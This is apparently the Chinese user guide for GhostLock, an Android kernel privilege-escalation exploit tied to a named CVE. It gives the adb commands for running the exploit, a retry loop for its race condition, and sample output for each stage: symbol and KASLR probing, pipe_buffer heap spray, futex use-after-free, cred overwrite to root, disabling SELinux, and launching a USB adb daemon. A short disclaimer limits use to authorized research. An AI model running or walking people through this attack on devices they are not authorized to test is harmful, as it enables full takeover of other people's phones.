---
title: 使用指南
description: GhostLock 的详细使用方法和技巧
---

## 基本用法

### 运行 exploit

```bash
adb shell /data/local/tmp/ghostlock
```

### 命令行选项

GhostLock 支持以下命令行选项：

```bash
# 显示详细输出
ghostlock -v

# 显示帮助信息
ghostlock -h

# 指定设备（多设备时）
ghostlock -d <device-serial>
```

## 运行流程

GhostLock 的运行流程分为以下几个阶段：

### 阶段 1：初始化

```
[*] GhostLock - CVE-2026-43499 Local Privilege Escalation
[*] Target kernel: 6.6.118-android15-8-gebdfad32d749-ab15099304-4k
[*] KASLR base: 0xffffffc080000000
```

- 检测内核版本
- 读取 kallsyms 获取符号地址
- 初始化内存布局

### 阶段 2：地址探测

```
[*] ashmem_misc: 0xffffffc08227c518
[*] ashmem_fops: 0xffffffc0812ef5c0
[*] SELinux enforcing: 0xffffffc082358ee0
```

- 扫描 `direct_map` 区域定位 `mm_struct`
- 查找 `ashmem_misc` 和 `ashmem_fops` 符号
- 确定 SELinux enforcing 标志地址

### 阶段 3：漏洞触发

```
[*] Exploiting...
[*] Setting up pipe spray...
[*] Triggering UAF...
[*] Controlling waiter fields...
```

- 使用 `pipe_buffer` 喷射内核堆
- 触发 futex PI 栈 UAF
- 控制释放的 waiter 内存

### 阶段 4：提权

```
[+] PSELECT path activated
[+] Pipe merge path activated
[+] Root shell obtained!
[+] SELinux disabled
```

- 利用 `rb_erase()` 实现任意写入
- 修改 `cred` 结构体提权
- 禁用 SELinux

### 阶段 5：验证

```
[*] Re-scanning ashmem_fops for CFI integrity check...
[+] CFI integrity verified
[*] miniadb listening on USB...
```

- 重新扫描验证 CFI 完整性
- 启动 miniADB 守护进程

## 高级用法

### 手动提取内核信息

如果你想手动提取内核信息，可以使用以下工具：

```bash
# 提取 kallsyms
python3 tools/run_kallsyms_finder.py extracted/Image.bin > kallsyms.txt

# 提取 BTF 信息
python3 tools/btf_task2.py > task_struct.txt
python3 tools/btf_structs2.py > structs.txt
```

### 添加新设备支持

参考 [添加新设备]({% link add-device.md %}) 指南。

### 调试模式

```bash
# 启用详细调试输出
ghostlock -vv

# 查看内核日志
adb shell dmesg | grep -i ghostlock

# 查看 exploit 进程状态
adb shell ps | grep ghostlock
```

## 输出说明

### 成功输出

```
[+] Root shell obtained!
[+] SELinux disabled
[*] miniadb listening on USB...
```

### 错误输出

```
[-] Failed to find ashmem_misc
[-] Kernel version not supported
[-] Exploitation failed, retrying...
```

### 警告输出

```
[!] Warning: CFI check failed
[!] Warning: Using fallback method
```

## 安全注意事项

⚠️ **重要：** 本工具仅用于安全研究和授权测试。

- 不要在未经授权的设备上测试
- 不要在生产环境中使用
- 遵守当地法律法规
- 负责任地披露漏洞

## 故障排除

### 问题 1：设备未连接

```bash
# 检查 USB 连接
adb devices

# 重启 adb 服务
adb kill-server
adb start-server
```

### 问题 2：权限不足

```bash
# 使用 root 权限
adb root

# 或者重新设置权限
adb shell chmod 755 /data/local/tmp/ghostlock
```

### 问题 3：内核版本不匹配

```bash
# 检查内核版本
adb shell uname -r

# 查看支持的版本
# 参考 README.md 中的支持设备列表
```

### 问题 4：exploit 失败

```bash
# 多试几次（竞争条件可能需要多次尝试）
for i in {1..5}; do
    echo "尝试 $i..."
    adb shell /data/local/tmp/ghostlock
    if [ $? -eq 0 ]; then
        break
    fi
    sleep 2
done
```

## 相关链接

- [快速开始]({% link quickstart.md %})
- [漏洞分析]({% link vulnerability.md %})
- [利用原理]({% link exploitation.md %})
- [设备支持]({% link devices.md %})
